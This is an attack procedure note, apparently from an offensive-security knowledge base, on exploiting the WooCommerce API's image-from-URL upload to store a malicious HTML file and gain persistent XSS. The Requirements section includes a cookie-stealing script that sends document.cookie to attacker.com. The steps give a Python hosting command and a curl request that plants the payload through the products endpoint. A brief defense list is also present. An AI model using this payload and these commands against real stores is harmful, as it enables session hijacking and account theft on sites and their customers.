---
id: proc-woocommerce-upload
tags:
  - file-upload
  - xss
  - api
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/upload-image-via-woocommerce-api]]'
verified: false
platforms:
  - Web
  - WordPress
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.196Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
---
# Upload Malicious HTML via URL in WooCommerce API

## Summary

This procedure exploits the WooCommerce API's image upload from URL feature by providing a URL to a malicious HTML file without an extension, leading to improper filename generation and storage as an executable .html file due to insufficient type validation.

## Description

WooCommerce allows uploading images for products via API by specifying a URL. For URLs without filenames (e.g., http://attacker.com/payload), it generates names based on content-type headers from the remote server. Without whitelisting image types, an HTML file with Content-Type: text/html can be saved as .html and served directly, enabling persistent XSS when accessed.

## Requirements

1. Valid WooCommerce API key with Read/Write permissions
2. Hosted malicious HTML payload (e.g., <html><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script></html>)
3. Network access to target API and control over payload server

## Defense

Defensive measures and detection strategies:

- Implement strict MIME type validation and extension whitelisting in upload handlers
- Scan uploaded files with antivirus or content scanners before storage
- Log and alert on API uploads from external URLs

## Objectives

1. Bypass file type restrictions to upload executable HTML
2. Store payload in media library for persistent access
3. Set up for XSS execution on view

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Host the HTML on a server responding with Content-Type: text/html and no extension in URL.

**Command** (no direct command; manual hosting):
```bash
# Example: Use Python to serve
python3 -m http.server 80 --directory /path/to/payload
```

> Ensure URL like http://attacker-ip/payload returns the HTML. Expected: Browser loads as HTML.

### Step 2: Upload via API

**Context**: Use the products endpoint to attach the image URL to a new product, triggering download and save.

**Command** ([[commands/upload-image-via-woocommerce-api]]):
```bash
curl -X POST "https://target.com/wp-json/wc/v3/products" \
  -u "ck_abc123:cs_def456" \
  -H "Content-Type: application/json" \
  -d '{"name":"Malicious Product","images":[{"src":"http://attacker.com/payload"}]}'
```

> Returns product ID with image URL. Check media library for .html file. Success if no validation error.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/upload-image-via-woocommerce-api]]

## Tools Used


## Tags

- [[file-upload]]
- [[xss]]
- [[api]]
